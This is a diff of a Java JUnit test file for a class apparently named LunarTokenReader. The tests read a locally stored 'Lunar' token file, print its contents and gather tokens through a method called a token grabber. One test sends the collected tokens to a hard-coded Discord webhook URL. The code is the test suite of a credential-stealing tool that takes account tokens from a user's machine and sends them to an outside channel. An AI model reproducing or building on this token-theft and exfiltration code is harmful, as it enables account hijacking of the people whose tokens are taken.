@@ -1,28 +1,22 @@
 package util;
 
-import com.google.gson.JsonElement;
-import com.google.gson.JsonObject;
 import org.junit.Test;
 import static org.junit.Assert.*;
 import java.io.*;
-import java.util.HashMap;
 import java.util.Map;
-import java.util.Set;
 
-import com.google.gson.Gson;
-
-public class TokenReaderTest {
+public class LunarTokenReaderTest {
 
     @Test
     public void testPath() {
-        TokenReader tr = new TokenReader();
+        LunarTokenReader tr = new LunarTokenReader();
         assertNotNull(tr.windowsPath);
         System.out.println("WindowsPath: " + tr.windowsPath);
     }
 
     @Test
     public void testFile() {
-        TokenReader tr = new TokenReader();
+        LunarTokenReader tr = new LunarTokenReader();
         File f = new File(tr.windowsPath);
         assertTrue(f.isFile() && f.canRead());
 
@@ -30,14 +24,14 @@ public class TokenReaderTest {
 
     @Test
     public void testReadFile() throws FileNotFoundException, IOException{
-        String content = new TokenReader().readLunarFile();
+        String content = new LunarTokenReader().readLunarFile();
         assertNotEquals(content,"");
         System.out.println(content);
     }
 
     @Test
     public void testTokenGrabber() throws IOException {
-        TokenReader tr = new TokenReader();
+        LunarTokenReader tr = new LunarTokenReader();
         Map<String, String> tokens = tr.getTokens();
 
         for(String key : tokens.keySet()) {
@@ -50,8 +44,9 @@ public class TokenReaderTest {
     public void sendTokensTest() {
         String webhookUrl = "https://discord.com/api/webhooks/1248630842947797042/u3zPVi_LZRCtZPGOEZqa-W0kjnNfy2B4lC85qwcfiz-BFAlSKUos2gRH9UZPyXr_G0lk";
         try {
-            TokenReader tr = new TokenReader();
-            tr.sendTokens(webhookUrl);
+            LunarTokenReader tr = new LunarTokenReader();
+            tr.setDiscordWebhook(webhookUrl);
+            tr.sendTokens("Lunar");
         } catch (Exception e) {
             System.out.println("TEST: Failed to send lunar tokens: " + e);
         }
